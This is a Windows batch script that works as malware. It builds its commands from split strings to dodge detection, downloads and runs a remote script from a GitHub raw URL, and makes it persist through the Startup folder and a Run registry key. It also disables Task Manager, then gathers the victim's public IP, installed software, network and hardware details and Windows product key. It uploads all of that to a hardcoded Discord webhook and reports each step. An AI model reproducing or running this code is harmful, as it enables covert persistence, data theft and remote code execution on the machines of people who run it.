@echo off
cls
setlocal enableextensions && setlocal enabledelayedexpansion

:: Define parts of directory paths and file names
set "a1=C"
set "a2=:\t"
set "a3=emp\"
set "a4=Z"
set "tempDir=%a1%%a2%%a3%%a4%"

:: Check if the temporary directory exists, if not, create it
if not exist "%tempDir%" (
    mkdir "%tempDir%"
)

:: Hide the script file
set "f1=at"
set "f2=tr"
set "f3=ib"
set "cmdFile=%0"
set "hideCmd=attrib -h -s %cmdFile%"
%hideCmd%

:: Define parts of the webhook URL
set "w1=https"
set "w2=:"
set "w3=//"
set "w4=discord"
set "w5=.com"
set "w6=/api/webhooks/"
set "w7=1268854626288140372/Jp_jALGydP2E3ZGckb3FOVzc9ZhkJqKxsKzHVegnO-OIAwAWymr6lsbjCK0DAP_ttRV2"
set "webhook=%w1%%w2%%w3%%w4%%w5%%w6%%w7%"

:: Define parts of the URL for the win.cmd file
set "u1=https"
set "u2=:"
set "u3=//github"
set "u4=.com/"
set "u5=invisibleghostshell-ux/"
set "u6=last/raw/main/"
set "u7=win1.cmd"
set "winURL=%u1%%u2%%u3%%u4%%u5%%u6%%u7%"

:: Download the win.cmd file
powershell -Command "(New-Object Net.WebClient).DownloadFile('%winURL%', '%tempDir%\win.cmd')"

:: Copy win.cmd to the Startup folder
set "s1=%USERPROFILE%"
set "s2=\Start Menu\Programs\Startup"
copy "%tempDir%\win.cmd" "%s1%%s2%"

:: Send notification to Discord
set "c1=curl"
set "c2=-X POST"
set "c3=-H Content-Type: application/json"
set "c4=-d {""content"":""Step 1: win.cmd downloaded and copied to Startup folder.""""}"
%c1% %c2% %webhook% %c3% %c4%

:: Define parts of the registry path
set "r1=HKCU\Soft"
set "r2=ware\Microsoft\Windo"
set "r3=ws\CurrentVersio"
set "r4=n\Run"

:: Define parts of the registry command
set "cmd1=reg"
set "cmd2= add "
set "cmd3=/v MyScript"
set "cmd4=/t REG_SZ"
set "cmd5=/d "
set "cmd6=%tempDir%\win.cmd"
set "cmd7=/f > nul"

:: Add a registry entry to run a batch file at user login
%cmd1%%cmd2%%r1%%r2%%r3%%r4% %cmd3% %cmd4% %cmd5%%cmd6% %cmd7%

:: Define parts of the registry path for disabling Task Manager
set "r5=\Policies\System"
set "r6=DisableTaskMgr"
set "cmd8=/t REG_DWORD"
set "cmd9=/d 1"
set "cmd10=/f >nul"

:: Disable Task Manager
%cmd1%%cmd2%%r1%%r2%%r3%%r5% /v %r6% %cmd8% %cmd9% %cmd10%

:: Send notification to Discord
set "c4=-d {""content"":""Step 2: Registry entries added.""""}"
%c1% %c2% %webhook% %c3% %c4%

:: Change to the temporary directory
cd /d %tempDir%

:: Get the public IP address and save it to a file
set "ipURL=https://ipv4.wtfismyip.com/text"
curl -s -o IP.txt %ipURL%
set /p IPv4=<IP.txt

:: Save installed application details to a file
powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table > '%tempDir%\apps.txt'"

:: Upload the application details file
set "fileParam=-F file=@%tempDir%\apps.txt"
curl -v %fileParam% %webhook%

:: Send notification to Discord
set "c4=-d {""content"":""Step 3: Application details collected and uploaded.""""}"
%c1% %c2% %webhook% %c3% %c4%

:: Collect system information and save it to a file
(
    echo Username %USERNAME%
    echo IP %IPv4%
    echo.
    ipconfig
    echo.
    getmac
    echo.
    wmic cpu get caption,name,deviceid,numberofcores,maxclockspeed,status
    echo.
    wmic computersystem get totalphysicalmemory
    echo.
    wmic partition get name,size,type
    echo.
    systeminfo
    echo.
    wmic path softwareLicensingService get OA3xOriginalProductKey
) >> %tempDir%\userdata.txt

:: Upload the collected system information
set "fileParam=-F file=@%tempDir%\userdata.txt"
curl -v %fileParam% %webhook%

:: Send notification to Discord
set "c4=-d {""content"":""Step 4: System information collected and uploaded.""""}"
%c1% %c2% %webhook% %c3% %c4%

:: Clean up downloaded and temporary files
set "delCmd=del %tempDir%\modss.zip"
%delCmd%

:: Download and execute a VBS script
set "vbsURL=%u1%%u2%%u3%%u4%%u5%%u6%win1.cmd"
powershell -Command "(New-Object Net.WebClient).DownloadFile('%vbsURL%', '%tempDir%\win1.cmd')"
start "" "%tempDir%\win1.cmd"

:: Send notification to Discord
set "c4=-d {""content"":""Step 5: cmd script downloaded and executed.""""}"
%c1% %c2% %webhook% %c3% %c4%

:: Send final notification to Discord
set "c4=-d {""content"":""Step 6: All data collected, files compressed, and sent.""""}"
%c1% %c2% %webhook% %c3% %c4%
